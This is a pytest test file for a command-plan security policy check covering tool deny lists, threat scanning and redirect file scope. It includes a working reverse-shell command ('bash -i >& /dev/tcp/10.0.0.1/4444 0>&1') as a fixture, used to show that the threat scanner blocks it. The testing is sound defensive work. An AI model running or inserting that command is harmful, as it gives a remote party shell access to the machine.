"""Tier 2: #5838 段3 -- ``check_exec_plan_policy`` applies segment/redirect
policy over an already-parsed :data:`~reyn.security.exec_plan.ExecPlan`.

Real ``OpContext`` + real ``PermissionResolver`` + real ``ContextualPermission``
+ real ``ThreatScanConfig`` throughout -- no mocks (CLAUDE.md testing policy:
never fake a cheaply-constructible collaborator). Plans are built directly as
:class:`ExecSegment`/:class:`ExecChainOp`/:class:`ExecRedirect` literals rather
than through ``parse_exec_plan`` -- this module's own contract is "given an
already-parsed plan", independent of how that plan was produced (段2's own
test file already covers the parse step exhaustively).

Falsification for both checks this module wires in is a real, reproducible
denial: the tool-axis case denies via the SAME ``ContextualPermission``/
``tool_contextually_denied`` predicate #5841 wired into ``dispatch_tool``
(``tests/security/test_contextual_permission_1827.py`` is that predicate's
own falsification, not repeated here); the threat-scan case denies via the
SAME real patterns ``tests/core/test_exec_scan_1822.py`` already falsifies
against a whole op's argv, applied here per segment instead.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from reyn.config.chat import ThreatScanConfig
from reyn.core.events.events import EventLog
from reyn.core.op_runtime.context import OpContext
from reyn.data.workspace.workspace import Workspace
from reyn.security.exec_plan import ExecChainOp, ExecRedirect, ExecSegment
from reyn.security.exec_plan_policy import check_exec_plan_policy
from reyn.security.permissions.effective import ContextualPermission
from reyn.security.permissions.permissions import PermissionDecl, PermissionResolver
from tests._support.events import collect_events, settle

# A reverse-shell argv shape test_exec_scan_1822.py's own
# test_exec_patterns_detect_malicious already falsifies against
# scan_for_threats directly (pattern_id "reverse_shell_devtcp") -- reused
# here as one segment's own argv, joined the same way _check_segment joins
# it ("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").
_REVERSE_SHELL_ARGV = ("bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1")


def _ctx(
    tmp_path: Path,
    *,
    contextual: "ContextualPermission | None" = None,
    threat_scan: "ThreatScanConfig | None" = None,
    permission_resolver: "PermissionResolver | None | object" = "unset",
    config: "dict | None" = None,
) -> "tuple[OpContext, list]":
    project_root = tmp_path / "proj"
    project_root.mkdir(parents=True, exist_ok=True)
    events = EventLog()
    collected = collect_events(events)
    workspace = Workspace(events=events, base_dir=project_root)
    resolver: "PermissionResolver | None"
    if permission_resolver == "unset":
        resolver = PermissionResolver(
            config_permissions=config or {}, project_root=project_root, interactive=False,
        )
    else:
        resolver = permission_resolver  # type: ignore[assignment]
    ctx = OpContext(
        workspace=workspace,
        events=events,
        permission_decl=PermissionDecl(),
        permission_resolver=resolver,
        actor="test",
        contextual_permission=contextual,
        threat_scan=threat_scan,
    )
    return ctx, collected


@pytest.mark.asyncio
async def test_segment_with_contextually_denied_binary_is_rejected(tmp_path: Path) -> None:
    """Tier 2: a segment whose resolved argv[0] basename is on the SAME
    per-session tool_deny set #5841 checks for a whole tool call is denied
    here too -- the exact predicate reuse this module's own docstring
    claims (``tool_contextually_denied`` against ``ctx.contextual_
    permission``), not a re-derived one."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"true"})),
    )
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    with pytest.raises(PermissionError, match="true"):
        await check_exec_plan_policy(plan, ctx)


@pytest.mark.asyncio
async def test_segment_not_on_the_deny_set_passes(tmp_path: Path) -> None:
    """Tier 2: FP gate -- an ordinary segment under a narrowing that denies
    a DIFFERENT name passes silently (never elevates, never over-denies)."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"rm"})),
    )
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    await check_exec_plan_policy(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_no_contextual_narrowing_leaves_the_tool_axis_unconstrained(tmp_path: Path) -> None:
    """Tier 2: ``contextual_permission=None`` (no narrowing at all, the
    overwhelming majority of sessions) never denies on the tool axis --
    mirrors ``tool_contextually_denied``'s own ``contextual is None ->
    False`` inertness."""
    ctx, _collected = _ctx(tmp_path, contextual=None)
    plan = [ExecSegment(argv=("/usr/bin/true",))]

    await check_exec_plan_policy(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_absolute_path_alias_still_resolves_to_the_denied_basename(tmp_path: Path) -> None:
    """Tier 2: the Codex #28732 basename-bypass class this module's own
    docstring names -- a segment naming the binary by an ABSOLUTE PATH
    (not the bare command a caller might expect the deny-set to key on)
    is still resolved to its basename before the tool-axis check, so an
    alias route does not evade a deny already in force for the bare name."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"true"})),
    )
    plan = [ExecSegment(argv=("/usr/bin/true", "--extra"))]

    with pytest.raises(PermissionError):
        await check_exec_plan_policy(plan, ctx)


@pytest.mark.asyncio
async def test_threat_scan_blocks_a_reverse_shell_segment(tmp_path: Path) -> None:
    """Tier 2: a segment whose own joined argv matches a real block-severity
    threat pattern (the same ``reverse_shell_devtcp`` pattern ``tests/core/
    test_exec_scan_1822.py`` falsifies) is denied, and an
    ``exec_threat_blocked`` audit-event is emitted -- mirrors
    ``sandboxed_exec.py``'s own pre-exec scan, applied per segment."""
    ctx, collected = _ctx(tmp_path, threat_scan=ThreatScanConfig())
    plan = [ExecSegment(argv=_REVERSE_SHELL_ARGV)]

    with pytest.raises(PermissionError, match="reverse_shell_devtcp"):
        await check_exec_plan_policy(plan, ctx)

    await settle(ctx.events)
    assert any(e.type == "exec_threat_blocked" for e in collected)


@pytest.mark.asyncio
async def test_threat_scan_disabled_lets_the_same_segment_pass(tmp_path: Path) -> None:
    """Tier 2: falsification gate for the test above -- the SAME reverse-
    shell segment, with scanning disabled, is NOT blocked. Proves the scan
    is load-bearing (not merely enabled everywhere and never actually
    checked in these tests)."""
    ctx, _collected = _ctx(tmp_path, threat_scan=ThreatScanConfig(enabled=False))
    plan = [ExecSegment(argv=_REVERSE_SHELL_ARGV)]

    await check_exec_plan_policy(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_no_threat_scan_config_is_a_noop(tmp_path: Path) -> None:
    """Tier 2: ``threat_scan=None`` (the ``OpContext`` default) skips the
    scan entirely -- byte-identical to a caller that never wired one, the
    same posture ``sandboxed_exec.py``'s own ``getattr(ctx, "threat_scan",
    None) is not None`` guard already documents."""
    ctx, _collected = _ctx(tmp_path, threat_scan=None)
    plan = [ExecSegment(argv=_REVERSE_SHELL_ARGV)]

    await check_exec_plan_policy(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_write_redirect_outside_scope_is_denied(tmp_path: Path) -> None:
    """Tier 2: an ``ExecRedirect(">")`` target outside the configured write
    scope is denied through the EXISTING ``require_file_write`` gate --
    the same primitive/scope ``op_runtime/file.py`` already enforces, no
    new file-permission concept. ``interactive=False``/no bus -> a
    non-interactive deny, matching ``require_file_write``'s own documented
    fallback."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecRedirect(op=">", path="/etc/definitely-outside-scope.txt")]

    with pytest.raises(PermissionError, match="was not approved"):
        await check_exec_plan_policy(plan, ctx)


@pytest.mark.asyncio
async def test_write_redirect_inside_default_scope_is_allowed(tmp_path: Path) -> None:
    """Tier 2: FP gate -- a redirect INSIDE the default write scope
    (``<zone-root>/.reyn``, ``require_file_write``'s own documented
    default) passes silently, proving the check above denies on SCOPE, not
    unconditionally."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecRedirect(op=">", path=".reyn/out.txt")]

    await check_exec_plan_policy(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_read_redirect_outside_scope_is_denied(tmp_path: Path) -> None:
    """Tier 2: an ``ExecRedirect("<")`` target outside the configured read
    scope goes through ``require_file_read``, the sibling gate to the
    write case above -- same primitive, opposite axis."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecRedirect(op="<", path="/etc/definitely-outside-scope.txt")]

    with pytest.raises(PermissionError, match="was not approved"):
        await check_exec_plan_policy(plan, ctx)


@pytest.mark.asyncio
async def test_no_permission_resolver_skips_the_redirect_check(tmp_path: Path) -> None:
    """Tier 2: ``permission_resolver=None`` (a narrower/test-shaped
    context) is a fail-open no-op for the redirect check -- mirrors
    ``op_runtime/file.py``'s own ``if ctx.permission_resolver is not
    None:`` guard EXACTLY (same fallback already accepted at every other
    ``require_file_*`` call site in this codebase, not a new posture
    introduced here)."""
    ctx, _collected = _ctx(tmp_path, permission_resolver=None)
    plan = [ExecRedirect(op=">", path="/etc/definitely-outside-scope.txt")]

    await check_exec_plan_policy(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_a_bare_chain_op_item_is_a_noop(tmp_path: Path) -> None:
    """Tier 2: an ``ExecChainOp`` carries no policy-relevant data of its
    own -- a plan containing only one is not denied by anything (the
    segments either side of it, if any, are what carry policy)."""
    ctx, _collected = _ctx(tmp_path)
    plan = [ExecChainOp(op="|")]

    await check_exec_plan_policy(plan, ctx)  # does not raise


@pytest.mark.asyncio
async def test_a_multi_item_plan_is_checked_left_to_right_and_stops_at_the_first_denial(
    tmp_path: Path,
) -> None:
    """Tier 2: architect's own worked example (PR #5984's pinned
    ``"ls -la | grep foo > out.txt"`` shape) as an already-built plan --
    the FIRST segment (``ls``) is allowed, the SECOND (``grep``, denied by
    this test's own narrowing) raises before the plan's own redirect is
    ever reached, matching every other ``require_*`` gate in this codebase
    (sequential, stop-on-first-denial, never collect-all)."""
    ctx, _collected = _ctx(
        tmp_path, contextual=ContextualPermission(tool_deny=frozenset({"grep"})),
    )
    plan = [
        ExecSegment(argv=("ls", "-la")),
        ExecChainOp(op="|"),
        ExecSegment(argv=("grep", "foo")),
        ExecRedirect(op=">", path="out.txt"),
    ]

    with pytest.raises(PermissionError, match="grep"):
        await check_exec_plan_policy(plan, ctx)


@pytest.mark.asyncio
async def test_the_same_plan_with_no_narrowing_passes_every_item(tmp_path: Path) -> None:
    """Tier 2: FP gate, sibling of the test above -- the identical plan
    with no narrowing on either segment name and both paths in scope
    passes through every item without raising."""
    ctx, _collected = _ctx(tmp_path)
    plan = [
        ExecSegment(argv=("ls", "-la")),
        ExecChainOp(op="|"),
        ExecSegment(argv=("grep", "foo")),
        ExecRedirect(op=">", path=".reyn/out.txt"),
    ]

    await check_exec_plan_policy(plan, ctx)  # does not raise
